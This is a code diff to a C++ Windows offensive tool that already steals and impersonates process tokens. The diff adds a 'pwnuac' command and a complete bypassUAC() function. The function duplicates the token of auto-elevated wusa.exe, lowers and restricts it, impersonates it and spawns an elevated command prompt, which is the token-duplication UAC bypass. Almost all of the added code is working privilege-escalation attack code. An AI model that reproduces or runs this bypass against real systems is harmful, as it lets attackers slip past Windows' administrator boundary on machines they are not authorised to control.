@@ -22,6 +22,7 @@ void spawn(DWORD);
 void spawn(DWORD, LPCWSTR, LPWSTR);
 void maketoken(LPWSTR, LPWSTR, LPWSTR);
 void redirectChildToParent(DWORD pid);
+void bypassUAC();
 
 
 int main(int argc, char* argv[]) {
@@ -32,6 +33,7 @@ int main(int argc, char* argv[]) {
 	po::options_description exec_desc("Execution Options");
 	po::options_description exec_literal("");
 	po::options_description maketoken_desc("Make Token Options");
+	po::options_description uacbypass_desc("UAC Bypass Options");
 	//General menu options
 	general_desc.add_options() ("help", "Display help menu.");
 	//Spawn menu options
@@ -42,7 +44,7 @@ int main(int argc, char* argv[]) {
 		;
 	//Exec menu options
 	exec_desc.add_options()
-		("exec", "Execute an instance of a specified program.")
+		("exec", "Execute an instance of a specified program under the impersonated context.")
 		("pid", po::value<DWORD>(), "Proccess ID to steal the token from.")
 		("prog", "The full path to the program to be executed.")
 		("args", "Optional execution arguments for the specified program.")
@@ -59,14 +61,16 @@ int main(int argc, char* argv[]) {
 		("password", po::value <std::string>(), "Password in plaintext format.")
 		("domain", po::value <std::string>(), "The domain the user belongs, if domain isn't specified the local machine will be used.")
 		;
+	//UAC Bypass Menu
+	uacbypass_desc.add_options() ("pwnuac", "Will try to bypass UAC using the token-duplication method.");
 	//Next we will merge them for the help menu
 	// Declare an options description instance which will include
 	// all the options
 	po::options_description all("Usage");
-	all.add(general_desc).add(impersonate_desc).add(exec_desc).add(maketoken_desc);
+	all.add(general_desc).add(impersonate_desc).add(exec_desc).add(maketoken_desc).add(uacbypass_desc);
 	//Make another options list to store the same settings but without the duplicate pid argument
 	po::options_description all_literal("");
-	all_literal.add(general_desc).add(impersonate_desc).add(exec_literal).add(maketoken_desc);
+	all_literal.add(general_desc).add(impersonate_desc).add(exec_literal).add(maketoken_desc).add(uacbypass_desc);
 	//Next lets create a map for the arguments
 	po::variables_map vm;
 	po::store(parse_command_line(argc, argv, all_literal), vm);
@@ -114,6 +118,8 @@ int main(int argc, char* argv[]) {
 	} else if (vm.count("make")) {
 		std::cout << maketoken_desc << std::endl;
 		ExitProcess(1);
+	} else if (vm.count("pwnuac")) {
+		bypassUAC();
 	} else {
 		printf("[-]Unknown Command\n");
 		ExitProcess(1);
@@ -138,7 +144,7 @@ void contextCheck() {
 	}
 }
 
-//This function transforms a c++ string to LPWSTR c_str
+//THis function transforms a c++ string to LPWSTR c_str
 LPWSTR stringToLPWSTR(const std::string& instr) {
 	// Assumes std::string is encoded in the current Windows ANSI codepage
 	int bufferlen = MultiByteToWideChar(CP_ACP, 0, instr.c_str(), instr.size(), NULL, 0);
@@ -432,4 +438,105 @@ void maketoken(LPWSTR username, LPWSTR password, LPWSTR domain) {
 	CloseHandle(processInformation.hProcess);
 	CloseHandle(processInformation.hThread);
 	ExitProcess(1);
+}
+
+//This function tries to bypass UAC by using the token-duplication method
+void bypassUAC() {
+	if (IsUserAnAdmin()) {
+		printf("[*]Already in elevated context!\n");
+		ExitProcess(1);
+	}
+	//Lets spawn an autoelevated application like wusa.exe or taskmgr.exe
+	//Initialize the structures for the process creation
+	SID_IDENTIFIER_AUTHORITY sSIA = SECURITY_MANDATORY_LABEL_AUTHORITY;
+	SID_AND_ATTRIBUTES sSAA;
+	TOKEN_MANDATORY_LABEL sTML;
+	HANDLE pSID;
+	SHELLEXECUTEINFO eWusa;
+	SecureZeroMemory(&eWusa, sizeof(SHELLEXECUTEINFO));
+	eWusa.cbSize = sizeof(eWusa);
+	eWusa.fMask = 0x40;
+	eWusa.lpFile = L"wusa.exe";
+	eWusa.nShow = 0x0;
+	//Now lets create the process
+	printf("[*]Spawning an instance of an autoelevated process\n");
+	if (!ShellExecuteEx(&eWusa)) {
+		printf("ShellExecuteEx() error : % u\n", GetLastError());
+		ExitProcess(-1);
+	}
+	printf("[+]Process Spawned\n");
+	//Now lets open a handle to the token
+	HANDLE hToken;
+	if (!OpenProcessToken(eWusa.hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &hToken)) {
+		printf("OpenProcessToken() error : % u\n", GetLastError());
+		ExitProcess(-1);
+	}
+	printf("[+]OpenProcessToken() success!\n");
+	//Now lets duplicate the token
+	HANDLE hTokenDuplicate;
+	if (!DuplicateTokenEx(hToken, 0xf01ff, NULL, SecurityImpersonation, TokenImpersonation, &hTokenDuplicate)) {
+		printf("hTokenDuplicate() error : % u\n", GetLastError());
+		ExitProcess(-1);
+	}
+	printf("[+]DuplicateTokenEx() succeed!\n");
+	//Next we need to downgrade the token into medium integrity level, also remove critical sids and privileges
+	//First we initialize the Sid
+	printf("[*]Creating new restricted SID\n");
+	if (!AllocateAndInitializeSid(&sSIA, 1, 0x2000, 0, 0, 0, 0, 0, 0, 0, &pSID)) {
+		printf("AllocateAndInitializeSid() error : % u\n", GetLastError());
+		ExitProcess(-1);
+	}
+	//Next we prepare the structure TOKEN_MANDATORY_LABEL to set the medium integrity of the token
+	sSAA.Sid = pSID;
+	sSAA.Attributes = SE_GROUP_INTEGRITY;
+	sTML.Label = sSAA;
+	printf("[*]Applying the restricted SID to the duplicated token\n");
+	//Next we will call SetTokenInformation to downgrade the Integrity of the token
+	if (SetTokenInformation(hTokenDuplicate, TokenIntegrityLevel, &sTML, sizeof(TOKEN_MANDATORY_LABEL)) == 0) {
+		printf("SetTokenInformation() error : % u\n", GetLastError());
+		ExitProcess(-1);
+	}
+	//Now i need to create the restricted token
+	HANDLE hTokenRestricted;
+	printf("[*]Attemping to create a restricted token\n");
+	//The LUA_TOKEN spesification means the token is for Limited/Least-Privilege User Account
+	if (CreateRestrictedToken(hTokenDuplicate, LUA_TOKEN, 0, NULL, 0, NULL, 0, NULL, &hTokenRestricted) == 0) {
+		printf("CreateRestrictedToken() error : % u\n", GetLastError());
+		ExitProcess(-1);
+	}
+	printf("[+]Restricted token created!\n");
+	HANDLE hTokenRestrictedDuplicate;
+	//Now lets duplicate the restricted token and make it available for impersonation
+	if (!DuplicateTokenEx(hTokenRestricted, TOKEN_QUERY | TOKEN_IMPERSONATE, NULL, SecurityImpersonation, TokenImpersonation, &hTokenRestrictedDuplicate)) {
+		printf("DuplicateTokenEx() error : % u\n", GetLastError());
+		ExitProcess(-1);
+	}
+	printf("[+]DuplicateTokenEx() succeed!\n");
+	//Now will impersonate the new token
+	if (!ImpersonateLoggedOnUser(hTokenRestrictedDuplicate)) {
+		printf("ImpersonateLoggedOnUser() error : % u\n", GetLastError());
+		ExitProcess(-1);
+	}
+	printf("[+]ImpersonateLoggedOnUser() succeed!\n");
+	//Now lets spawn a command prompt using the new Impersonated context
+	STARTUPINFO si;
+	PROCESS_INFORMATION pi;
+	SecureZeroMemory(&si, sizeof(si));
+	SecureZeroMemory(&pi, sizeof(pi));
+	si.cb = sizeof(si);
+	printf("[*]Spawning new elevated process\n");
+	//Now lest create a process under the new elevated context
+	if (!CreateProcessWithLogonW(L"sickboy", L"rocks", L"pwned", LOGON_NETCREDENTIALS_ONLY, L"C:\\Windows\\System32\\cmd.exe", NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
+		printf("CreateProcessWithLogonW() error : % u\n", GetLastError());
+		printf("[-]Target isn't vulnerable!\n");
+		ExitProcess(-1);
+	}
+	printf("[+]Process spawned!\n");
+	//Closing handles
+	CloseHandle(hToken);
+	CloseHandle(hTokenDuplicate);
+	CloseHandle(hTokenRestricted);
+	CloseHandle(hTokenRestrictedDuplicate);
+	CloseHandle(pi.hProcess);
+	CloseHandle(pi.hThread);
 }
